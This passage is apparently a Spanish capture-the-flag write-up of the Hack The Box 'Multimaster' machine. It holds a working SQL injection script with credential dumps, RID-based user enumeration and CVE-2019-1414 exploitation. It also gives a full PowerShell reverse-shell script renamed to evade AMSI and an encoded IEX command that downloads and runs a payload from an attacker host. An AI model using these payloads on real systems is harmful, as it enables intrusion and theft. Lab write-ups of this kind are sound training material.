+    data_post = '{"name": "%s"}' % sqlmodified
+    
+    
+    r = requests.post(main_url, headers=headers, data=data_post)
+
+    data_json = json.loads(r.text)
+
+    return (json.dumps(data_json,indent=4))
+
+if __name__ == '__main__':
+
+#mediante un bucle recibimos la data como input
+
+    while True:
+        sqlinyection = input("&gt; ")
+        sqlinyection = sqlinyection.strip()
+        sqlmodified = recivesql(sqlinyection)
+        response_json = sendsql(sqlmodified)
+
+        print(response_json)
+</code></pre>
+
+<p>Ejecutamos el script y realizamos una inyeccion <code>sql</code>.</p>
+
+<pre><code class="language-bash">❯ python3 sql_inject.py
+&gt; ttest' union select 1,schema_name,3,4,5 from information_schema.schemata-- -
+[
+    {
+        "id": 1,
+        "name": "db_accessadmin",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "db_backupoperator",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "db_datareader",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "db_datawriter",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "db_ddladmin",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "db_denydatareader",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "db_denydatawriter",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "db_owner",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "db_securityadmin",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "dbo",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "guest",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "INFORMATION_SCHEMA",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    },
+    {
+        "id": 1,
+        "name": "sys",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+&gt;
+</code></pre>
+<p>Enumerando la base de datos <code>dbo</code> encontramos usuarios y contraseñas encriptadas.</p>
+
+<pre><code class="language-bash">aldom:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+alyx:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
+ckane:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+cyork:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+egre55:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
+ilee:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+james:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+jorden:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+kpage:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+minatotw:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
+nbourne:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
+okent:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
+rmartin:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
+sbauer:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+shayna:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+zac:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+zpowers:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+</code></pre>
+
+<p>Usaremos <code>hashcat</code> para crackear los hashes, y logramos obtener 3 contraseñas.</p>
+
+<pre><code class="language-bash">password1
+finance1
+banking1
+</code></pre>
+
+<p>Ya que tenemos una lista de usuarios y contraeñas probamos a validar si alguna de ellas es valida con <code>crackmapexec</code> y nos reprota que ninguna es valida.</p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.179 -u users.txt -p passwords --continue-on-success
+SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking1 STATUS_LOGON_FAILURE
+</code></pre>
+
+<p>Sim embargo debemos recordar que cuando nos encotramos en un entorno de directorio activo, podemos enumerar usuarios o informacion del <code>DC</code> a partir de inyecciones.</p>
+
+<pre><code class="language-bash">&gt; test' union select 1,default_domain(),3,4,5-- -
+[
+    {
+        "id": 1,
+        "name": "MEGACORP",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+&gt;  
+</code></pre>
+
+<p>Ahora con una query especifica vamos a lista el SID y RID correspondiente al usuario <code>Administrator</code></p>
+
+<blockquote>
+  <p>SID Y RID: El Identificador Relativo (RID) es parte del Identificador de Seguridad (SID) en los dominios de Microsoft Windows. Es la parte del SID que identifica a un principal de seguridad (un usuario, grupo o equipo) en relación con la autoridad que expidió el SID.</p>
+</blockquote>
+
+<pre><code class="language-bash">&gt; testt' union select 1,(select sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))),3,4,5-- -
+[
+    {
+        "id": 1,
+        "name": "0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+&gt;
+</code></pre>
+
+<p>De el resultado que nos reporta los ultimos 8 caracteres corresponden  al RDI, que viene a estar representado en hexadecimal si lo tratamos un poco.</p>
+
+<pre><code class="language-python">❯ python3
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; 0x01f4
+500
+&gt;&gt;&gt; hex(500)
+'0x1f4'
+&gt;&gt;&gt; hex(501)
+'0x1f5
+</code></pre>
+
+<p>Si modificamos el rdi con el valor hexadecimal de <code>501</code>, entonces correspondera a otro usuario, en este caso <code>Ghest</code>.</p>
+
+<pre><code class="language-bash">&gt; test' union select 1,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f5010000)),3,4,5-- -
+[
+    {
+        "id": 1,
+        "name": "MEGACORP\\Guest",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+</code></pre>
+
+<p>Esto nos da la idea que podemos lista los usuarios del <code>DC</code> a partir de poder conmutar el <code>RID</code>, para ello en vez de hacerlo uno por uno, vamos a modificar un poco el script que ya teniamos para gestionarlo mejor.</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import requests, time, json, signal
+
+def def_handler(sig, frame):
+    print("\n[!] Saliendo...!\n")
+    sys.exit(1)
+
+#ctrl_c
+signal.signal(signal.SIGINT, def_handler)
+
+#global_variables
+main_url = "http://10.10.10.179/api/getColleagues"
+sid = "0x0105000000000005150000001c00d1bcd181f1492bdfc236"
+
+#tratamos la data
+def recivesql(sqlinyection):
+    sqlmodified = ""
+    for character in sqlinyection:
+        sqlmodified += "\\u00" + hex(ord(character))[2:]
+
+    return sqlmodified
+
+#enviamos la data procesada
+def sendsql(sqlmodified):
+
+    headers = {
+        'Content-Type': 'application/json;charset=utf-8'
+    }
+
+    data_post = '{"name": "%s"}' % sqlmodified
+    
+    
+    r = requests.post(main_url, headers=headers, data=data_post)
+
+    data_json = json.loads(r.text)
+
+    return (json.dumps(data_json,indent=4))
+
+#obtebemos el RID en el formato adecuado
+def getRID(i):
+    cadena = hex(i).replace("x","")
+    lista = []
+    for caracter in cadena:
+        lista.append(caracter)
+    rid = lista[2] + lista[3] + lista[0] +lista[1] + "0000"
+
+    return rid
+
+if __name__ == '__main__':
+
+#establecemos un rango que casi siempre corresponden a los usuarios
+    for i in range(1100, 1200):
+        rid = getRID(i)
+        sqli = "ttest' union select 1,(select SUSER_SNAME(%s%s)),3,4,5-- -" % (sid, rid)
+        sqlmodified = recivesql(sqli)
+        response_json = sendsql(sqlmodified)
+
+        print(response_json)
+    
+        time.sleep(2)
+</code></pre>
+
+<p>Una vez ejecutamos el script despues de un breve momento obtenemos nuevos usuarios.</p>
+
+<pre><code class="language-json">❯ python3 sql_inject.py
+[
+    {
+        "id": 1,
+        "name": "",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+[
+    {
+        "id": 1,
+        "name": "MEGACORP\\DnsAdmins",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+[
+    {
+        "id": 1,
+        "name": "MEGACORP\\DnsUpdateProxy",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+[
+    {
+        "id": 1,
+        "name": "MEGACORP\\svc-nas",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+[
+    {
+        "id": 1,
+        "name": "MEGACORP\\Privileged IT Accounts",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+[
+    
+    {
+        "id": 1,
+        "name": "MEGACORP\\tushikikatomo",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+[
+    {
+        "id": 1,
+        "name": "MEGACORP\\andrew",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+[
+    {
+        "id": 1,
+        "name": "MEGACORP\\lana",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
+</code></pre>
+
+<p>Con estos nuevos usuarios validamos con <code>crackmapexec</code> y esta vez obtenemos unas credenciales validas correspondiente al usuario <code>tushikikatomo</code></p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.179 -u users.txt -p passwords --continue-on-success
+SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:password1 STATUS_LOGON_FAILURE
+</code></pre>
+
+<p>Como antes <code>nmap</code> nos reporto que el puerto <code>5985</code> estaba abierto intentaremos conectarnos con estas credenciales con <code>evil-winrm</code>y visualizamos la primera flag <code>user.txt</code></p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.10.179 -u 'tushikikatomo' -p 'finance1'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt; cd ..\Desktop
+*Evil-WinRM* PS C:\Users\alcibiades\Desktop&gt; type user.txt
+9d5ca88b1cafe75450e0b7a7b03c7834
+</code></pre>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Enumerando un poco el sistema encontramos que se ejecuta el proceso <code>Code</code> correspondiente a <code>Visual Code</code></p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\alcibiades\Desktop&gt; Get-Process
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    277      51    57564      74188               652   1 Code
+    576      39    30472      72024              1212   1 Code
+    403      53    96468     122704              5464   1 Code
+    315      31    37032      62272              5576   1 Code
+    397      21    16804      23172              5836   1 Code
+    194      15     6112      12432              6056   1 Code
+     63       4      708       3532              5832   0 CompatTelRunner
+     93       8     1308       5884              4092   0 conhost
+</code></pre>
+
+<p>Vamos a la ruta, lo ejecutamos con el panel de ayuda y y este nos devuelve su version.</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin&gt; .\code -h
+Visual Studio Code 1.37.1
+
+Usage: code.exe [options][paths...]
+</code></pre>
+
+<p>Despues de realizar una busqueda encontramos el <code>CVE-2019-1414</code> asociado a esta version para elevegar privilegios a traves de la exposicion de un debug listener.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Multimaster/multi7.PNG" alt="" /></p>
+
+<p>Mayor detalle en el articulo a continuacion:</p>
+
+<ul>
+  <li><a href="https://iwantmore.pizza/posts/cve-2019-1414.html">https://iwantmore.pizza/posts/cve-2019-1414.html</a></li>
+</ul>
+
+<p>Usaremos la herramienta <code>cefdebug</code> de github para explotar esta vulnerabilidad</p>
+
+<ul>
+  <li><a href="https://github.com/taviso/cefdebug">https://github.com/taviso/cefdebug</a></li>
+</ul>
+
+<p>Nos descargamos el ejecutable y lo subimos a la maquina victima en este caso lo hare con un recurso compartido, pero se puede hacer de muchas maneras.</p>
+
+<pre><code class="language-bash">❯ impacket-smbserver smbFolder $(pwd) -smb2support
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; copy \\10.10.16.6\smbFolder\ceffdebug.exe ceffdebug.exe
+</code></pre>
+
+<p>Para ejecutarlo solo debemos seguir los pasos tal cual el repositorio.</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; .\ceffdebug.exe
+ceffdebug.exe : [2023/04/02 09:05:12:5013] U: There are 6 tcp sockets in state listen.
+    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...n state listen.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2023/04/02 09:05:32:5800] U: There were 4 servers that appear to be CEF debuggers.
+[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:11996/b1874235-1857-4869-9ded-b35ae9c0f43d
+[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:52031/ef49c60c-66f9-448b-82a9-b08dc1a07022
+[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1
+[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:43978/c8928169-15af-4124-83a5-42b180e1b697
+*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; .\ceffdebug.exe --url ws://127.0.0.1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1 --code "process.mainModule.require('child_process').exec('ping 10.10.16.6')"
+ceffdebug.exe : [2023/04/02 09:05:58:8202] U: &gt;&gt;&gt; process.mainModule.require('child_process').exec('ping 10.10.16.6')
+    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...ng 10.10.16.6'):String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2023/04/02 09:05:58:8202] U: &lt;&lt;&lt; ChildProcess
+</code></pre>
+
+<p>y al ponernos en escucha con <code>tcpdump</code> recibimos la traza <code>icmp</code></p>
+
+<pre><code class="language-bash">❯ tcpdump -i tun0 -n icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+15:59:01.108853 IP 10.10.10.179 &gt; 10.10.16.6: ICMP echo request, id 1, seq 1, length 40
+15:59:01.108917 IP 10.10.16.6 &gt; 10.10.10.179: ICMP echo reply, id 1, seq 1, length 40
+15:59:02.150656 IP 10.10.10.179 &gt; 10.10.16.6: ICMP echo request, id 1, seq 2, length 40
+15:59:02.150666 IP 10.10.16.6 &gt; 10.10.10.179: ICMP echo reply, id 1, seq 2, length 40
+</code></pre>
+
+<p>Lo siguiente sera ganar acceso a traves de una consola interactiva, para ello usaremos el script <code>Invoke-PowerShellTcp.ps1</code> del repositorio de <code>nishang</code></p>
+
+<ul>
+  <li><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></li>
+</ul>
+
+<p>Ahora para poder realizar <code>AMSI bypass</code>, debemos editar el script cambiando el nombre de la funcion y borrando los comentarios para evitar problemas en la ejecucion.</p>
+
+<pre><code class="language-powershell">function dalecontodo 
+{ 
+    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName="reverse")]
+        [Switch]
+        $Reverse,
+
+        [Parameter(ParameterSetName="bind")]
+        [Switch]
+        $Bind
+
+    )
+
+    
+    try 
+    {
+        if ($Reverse)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        }
+
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+dalecontodo -Reverse -IPAddress 10.10.16.3 -Port 443
+</code></pre>
+
+<p>En la maquina victima ejecutaremos una peticion al script con <code>Iex</code> para que nos lo interprete, pero antes debemos hacerlo en un formato que windows entienda. Para ello usaremos <code>iconv</code> y lo transformaremos  a <code>base64</code> de este modo poder ejecutar la peticion con <code>powershell</code></p>
+
+<pre><code class="language-bash">❯ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/PS.ps1')" | iconv -t utf-16le | base64 -w 0; echo
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMALwBQAFMALgBwAHMAMQAnACkA
+</code></pre>
+
+<p>Teniendo el formato adecuando podemos pasar a ejecutar el <code>cefdebug</code>.</p>
+
+<p>Compartimos el <code>PS.ps1</code> y seguidamente con <code>rlwrap</code> y <code>ntcat</code> ponernos en escucha.</p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.179 - - [02/Apr/2023 16:23:11] "GET /PS.ps1 HTTP/1.1" 200 -
+</code></pre>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; .\ceffdebug.exe
+ceffdebug.exe : [2023/04/02 09:28:38:6062] U: There are 3 tcp sockets in state listen.
+    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...n state listen.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2023/04/02 09:28:58:6598] U: There were 1 servers that appear to be CEF debuggers.
+[2023/04/02 09:28:58:6618] U: ws://127.0.0.1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe
+
+*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; .\ceffdebug.exe --url ws://127.0.0.1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe --code "process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwAHMAMQAnACkA')"
+ceffdebug.exe : [2023/04/02 09:30:09:1259] U: &gt;&gt;&gt; process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwA...
+    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...wBQAFMALgBwA...:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2023/04/02 09:30:09:1269] U: &lt;&lt;&lt; ChildProcess
+</code></pre>
+<p>y recimos una consola como el usuario <code>cyork</code></p>
+
+<pre><code class="language-bash">❯ rlwrap ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.179.
+Ncat: Connection from 10.10.10.179:50183.
+Windows PowerShell running as user cyork on MULTIMASTER
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+whoami
+megacorp\cyork
+</code></pre>
+
+<p>Listando los grupos del usuario, vemos que pertenece al grupo <code>Developers</code>; este grupo tiene acceso al directorio <code>inetpub\wwwroot</code></p>
+
+<p>Dentro encontramos archivos <code>dll</code>, concretamente un archivo de nombre <code>MultimasterAPI.dll</code> que procederemos a traernos a nuestra maquina.</p>
+
+<pre><code class="language-powershell">dir
+    Directory: C:\inetpub\wwwroot\bin
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         1/7/2020   9:28 PM                roslyn                                                                
+-a----        2/21/2013   7:13 PM         102912 Antlr3.Runtime.dll                                                    
+-a----        2/21/2013   7:13 PM         431616 Antlr3.Runtime.pdb                                                    
+-a----        5/24/2018   1:08 AM          40080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll                
+-a----        7/24/2012  11:18 PM          45416 Microsoft.Web.Infrastructure.dll                                      
+-a----         1/9/2020   4:13 AM          13824 MultimasterAPI.dll                                                    
+-a----         1/9/2020   4:13 AM          28160 MultimasterAPI.pdb                                                    
+-a----        2/17/2018   8:14 PM         664576 Newtonsoft.Json.dll                                                   
+-a----       11/27/2018  11:30 PM         178808 System.Net.Http.Formatting.dll                                        
+-a----       11/27/2018  11:28 PM          27768 System.Web.Cors.dll                                                   
+-a----        1/27/2015   2:34 PM         139976 System.Web.Helpers.dll                                                
+-a----       11/27/2018  11:31 PM          39352 System.Web.Http.Cors.dll                                              
+-a----       11/27/2018  11:31 PM         455096 System.Web.Http.dll                                                   
+-a----        1/31/2018  10:49 PM          77520 System.Web.Http.WebHost.dll                                           
+-a----        1/27/2015   2:32 PM         566472 System.Web.Mvc.dll                                                    
+-a----        2/11/2014   1:56 AM          70864 System.Web.Optimization.dll                                           
+-a----        1/27/2015   2:32 PM         272072 System.Web.Razor.dll                                                  
+-a----        1/27/2015   2:34 PM          41672 System.Web.WebPages.Deployment.dll                                    
+-a----        1/27/2015   2:34 PM         211656 System.Web.WebPages.dll                                               
+-a----        1/27/2015   2:34 PM          39624 System.Web.WebPages.Razor.dll                                         
+-a----        7/17/2013   4:33 AM        1276568 WebGrease.dll                                                         
+PS C:\inetpub\wwwroot\bin&gt;
+</code></pre>
+
+<p>Vemos la lista de caracteres imprimibles con <code>strings</code>, pero al ser un ejecutable de windows usaremos el parametro <code>-e l</code> para que nos liste mayor informacion.</p>
+
+<pre><code class="language-bash">❯ strings -e l MultimasterAPI.dll
+FROM
+WHERE
+LIKE
+INFORMATION_SCHEMA
+MASTER
+{ "info" : "MegaCorp API" }
+application/json
+server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
+</code></pre>
+
+<p>Obtenemos una nueva contraseña y volveremos a validarla con <code>crackmapexec</code> si corrsponde a otro usuario.</p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.179 -u users.txt -p 'D3veL0pM3nT!' --continue-on-success
+SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT!
+</code></pre>
+
+<p>Con estas nuevas credenciales nos volvemos a conectar con <code>evil-winrm</code> y tendriamos acceso esta vez como <code>sbauer</code></p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.10.179 -u 'sbauer' -p 'D3veL0pM3nT!'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\sbauer\Documents&gt; whoami
+megacorp\sbauer
+</code></pre>
+
+<p>Seguidamente subiremos el ejecutable <code>sharphound.exe</code> para recopilar datos de <code>DC</code> que posteriormente con <code>bloodhound</code> interpretaremos.</p>
+
+<p>Una vez tengamos el archivo en la maquina victima lo ejecutamos y este nos generara un archivo <code>.zip</code> que abriremos en <code>bloodhound</code></p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\WIndows\Temp\Privesc&gt; .\SharpHound.exe -c All
+2023-04-02T09:45:51.8354209-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
